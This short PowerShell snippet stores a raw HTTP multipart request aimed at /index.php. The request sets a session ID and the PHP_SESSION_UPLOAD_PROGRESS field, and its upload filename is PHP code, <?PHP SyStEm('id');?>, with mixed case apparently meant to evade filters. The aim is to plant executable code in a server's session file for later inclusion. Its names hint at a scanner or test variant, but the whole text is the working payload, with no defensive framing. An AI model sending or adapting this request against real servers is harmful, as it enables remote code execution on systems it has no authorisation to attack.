$request = @'
POST /index.php HTTP/1.1
Content-Type: Multipart/Form-Data; boundary=--upload-check

----upload-check
Content-Disposition: form-data; name="PHPSESSID"

variant-session
----upload-check
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
----upload-check
Content-Disposition: form-data; name="f"; filename="<?PHP SyStEm('id');?>"
Content-Type: text/plain

Z
----upload-check--
'@
